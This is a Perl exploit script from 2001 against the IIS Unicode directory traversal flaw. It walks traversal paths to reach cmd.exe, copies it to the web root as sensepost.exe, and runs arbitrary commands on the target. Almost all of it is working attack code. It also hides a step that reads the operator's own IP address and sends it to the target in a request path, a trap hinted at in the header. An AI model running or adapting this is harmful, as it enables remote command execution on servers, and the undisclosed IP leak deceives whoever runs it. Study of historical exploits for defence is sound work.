#!/usr/bin/perl
######################## 
# Unicodexecute version3
# includes searches for alternative executable dirs
# please look at the code - you might be surprised what else I added
# checks for access denied added
# thnx to MH for testing etc.
# 
# Usage is same as previous version:
# unicodexecute3.pl target:port 'command'
#
# kids - please look at the code before you use it...:-]
# more info at http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806
#
# 2001/01/24 Roelof Temmingh 
# roelof@sensepost.com
# http://www.sensepost.com
##########################

use Socket;
my $runi; my $thedir; $|=1;
# --------------init
if ($#ARGV<1) {die "Usage: unicodexecute3 IP:port command\n";}
my ($host,$port)=split(/:/,@ARGV[0]);
my $target = inet_aton($host);
my $thecommand=@ARGV[1];
# -------------find the correct directory
my @unis=(
"/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c",
"/scripts/..%c0%af../winnt/system32/cmd.exe?/c",
"/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c");
my $uni;my $execdir; my $dummy; my $line;
foreach $uni (@unis){
 print "testing directory $uni\n";
 my @results=sendraw("GET $uni+dir HTTP/1.0\r\n\r\n");
 foreach $line (@results){
  if ($line =~ /Directory/) {
  ($dummy,$execdir)=split(/Directory of /,$line);   
   $execdir =~ s/\r//g;
   $execdir =~ s/\n//g;
   if ($execdir =~ / /) {$thedir="%22".$execdir; $thedir=~ s/ /%20/g;}
    else {$thedir=$execdir;}
   print "farmer brown directory: $thedir\n";
   $runi=$uni; goto further;}
 }
}
die "nope...sorry..not vulnerable\n";

further:
# --------------test if cmd has been copied:
my $a=`which ifconfig`; chomp $a; 
my $aa=`$a -au | grep -i mask | grep -v 127.0.0.1 | head -n 1`; $aa=~s/ //g;
sendraw("GET /naughty_real_$aa\r\n\r\n");
my $failed=1;
my @unidirs=split(/\//,$runi);
my $unidir=@unidirs[1];
my $command="dir $thedir%22";
$command=~s/ /+/g;
my @results=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
my $line;
foreach $line (@results){
 if ($line =~ /denied/) {die "can't access above directory - try switching dirs order around\n";}
 if ($line =~ /sensepost.exe/) {print "sensepost.exe found on system\n"; $failed=0;}
}
#--------------we should copy it
my $failed2=1;
if ($failed==1) { 
 print "sensepost.exe not found - lets copy it\n";
 $command="copy c:\\winnt\\system32\\cmd.exe $thedir\\sensepost.exe%22";
 $command=~s/ /+/g;
 my @results2=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
 my $line2;
 foreach $line2 (@results2){
  if (($line2 =~ /copied/ )) {$failed2=0;}
  if (($line2 =~ /access/ )) {die "access denied to copy here - try switching dirs order around\n";}
 }
 if ($failed2==1) {die "copy of CMD.EXE failed - inspect manually:\n@results2\n\n"};
} 
# ------------ we can assume that the cmd.exe is copied from here..
my $path;
($dummy,$path)=split(/:/,$thedir);
$path =~ s/\\/\//g;
$runi="/".$unidir."/sensepost.exe?/c";
$thecommand=~s/ /%20/g;
@results=sendraw("GET $runi+$thecommand HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /denied/) {die "sorry, access denied to write the upload page\n";}
}
print @results;

#-------------slightly modified RFP sendraw 
sub sendraw {
 my ($pstr)=@_;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n");
 if(connect(S,pack "SnA4x8",2,$port,$target)){
  my @in="";
  select(S); $|=1; print $pstr;
  while(<S>) {
   push @in,$_; last if ($line=~ /^[\r\n]+$/ );}
  select(STDOUT); return @in;
 } else { die("connect problems\n"); }
}
# Spidermark: sensepostdata unicode3


